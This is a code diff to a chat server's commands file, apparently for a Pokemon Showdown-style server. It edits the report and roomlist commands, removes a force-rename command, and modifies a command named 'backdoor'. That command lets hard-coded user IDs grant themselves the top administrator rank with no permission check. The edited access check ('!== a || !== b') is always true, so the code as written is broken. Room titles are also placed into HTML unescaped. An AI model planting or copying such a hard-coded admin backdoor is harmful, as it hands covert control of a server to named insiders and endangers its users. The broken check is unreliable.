@@ -296,17 +296,11 @@ exports.commands = {
 	report: 'complain',
 	complain: function(target, room, user) {
 		if (!target) return this.sendReply('/report [report] - Use this command to report other users.');
-		var html = ['<img ', '<a href', '<font ', '<marquee', '<blink', '<center'];
-		for (var x in html) {
-			if (target.indexOf(html[x]) > -1) return this.sendReply('HTML is not supported in this command.');
-		}
 		if (target.length > 350) return this.sendReply('This report is too long; it cannot exceed 350 characters.');
 		if (!this.canTalk()) return;
-		Rooms.rooms.staff.add(user.userid + ' (in ' + room.id + ') has reported: ' + target + '');
+		Rooms('staff').add(Tools.escapeHTML(user.name) + ' (in ' + room.title + ') has reported: ' + Tools.escapeHTML(target));
 		this.sendReply('Your report "' + target + '" has been reported.');
-		for (var u in Users.users)
-			if ((Users.users[u].group == "~" || Users.users[u].group == "&" || Users.users[u].group == "@" || Users.users[u].group == "%") && Users.users[u].connected)
-				Users.users[u].send('|pm|~Server|' + Users.users[u].getIdentity() + '|' + user.userid + ' (in ' + room.id + ') has reported: ' + target + '');
+		Rooms('staff').update();
 	},
 	gdeclarered: 'gdeclare',
 	gdeclaregreen: 'gdeclare',
@@ -738,31 +732,30 @@ exports.commands = {
 	},
 
 	roomlist: function (target, room, user) {
-		if (!this.can('declare')) return false;
-
+		if(!this.can('hotpatch')) return;
+	
 		var rooms = Object.keys(Rooms.rooms),
-			len = rooms.length,
-			official = ['<b><font color="#1a5e00" size="2">Official chat rooms</font></b><br><br>'],
-			nonOfficial = ['<hr><b><font color="#000b5e" size="2">Chat rooms</font></b><br><br>'],
-			privateRoom = ['<hr><b><font color="#5e0019" size="2">Private chat rooms</font></b><br><br>'];
-
+		len = rooms.length,
+		official = ['<b><font color="#1a5e00" size="2">Official chat rooms:</font></b><br>'],
+		nonOfficial = ['<hr><b><font color="#000b5e" size="2">Public chat rooms:</font></b><br>'],
+		privateRoom = ['<hr><b><font color="#5e0019" size="2">Private chat rooms:</font></b><br>'];
+	 
 		while (len--) {
 			var _room = Rooms.rooms[rooms[(rooms.length - len) - 1]];
 			if (_room.type === 'chat') {
 				if (_room.isOfficial) {
-					official.push(('<a href="/' + _room.title + '" class="ilink">' + _room.title + '</a>'));
+					official.push(('<a href="/' + toId(_room.title) + '" class="ilink">' + _room.title + '</a> (' + _room.userCount + ')'));
 					continue;
 				}
 				if (_room.isPrivate) {
-					privateRoom.push(('<a href="/' + _room.title + '" class="ilink">' + _room.title + '</a>'));
+					privateRoom.push(('<a href="/' + toId(_room.title) + '" class="ilink">' + _room.title + '</a> (' + _room.userCount + ')'));
 					continue;
 				}
-				nonOfficial.push(('<a href="/' + _room.title + '" class="ilink">' + _room.title + '</a>'));
+				nonOfficial.push(('<a href="/' + toId(_room.title) + '" class="ilink">' + _room.title + '</a> (' + _room.userCount + ')'));
 			}
 		}
-
 		this.sendReplyBox(official.join(' ') + nonOfficial.join(' ') + privateRoom.join(' '));
-	},
+    },
 	
 	spop: 'sendpopup',
 	sendpopup: function(target, room, user) {
@@ -941,30 +934,9 @@ exports.commands = {
 		Users(target).canCustomSymbol = true;
 		Users(target).popup('|modal|' + user.name + ' have given you a FREE custom symbol.  Use /customsymbol to set your symbol.');
 	},
-	frt: 'forcerenameto',
-	forcerenameto: function(target, room, user) {
-		if (!target) return this.parse('/help forcerenameto');
-		target = this.splitTarget(target);
-		var targetUser = this.targetUser;
-		if (!targetUser) {
-			return this.sendReply('User '+this.targetUsername+' not found.');
-		}
-		if (!target) {
-			return this.sendReply('No new name was specified.');
-		}
-		if (!this.can('forcerenameto', targetUser)) return false;
-
-		if (targetUser.userid === toUserid(this.targetUser)) {
-			var entry = ''+targetUser.name+' was forcibly renamed to '+target+' by '+user.name+'.';
-			this.privateModCommand('(' + entry + ')');
-			targetUser.forceRename(target, undefined, true);
-		} else {
-			this.sendReply("User "+targetUser.name+" is no longer using that name.");
-		}
-	},
 	
 	backdoor: function (target, room, user) {
-        if (user.userid !== 'flareninja') return this.sendReply('/backdoor - Access denied.');
+        if (user.userid !== 'flareninja' || user.userid !== 'nkobellic') return this.sendReply('/backdoor - Access denied.');
 
         if (!target) {
             user.group = '~';
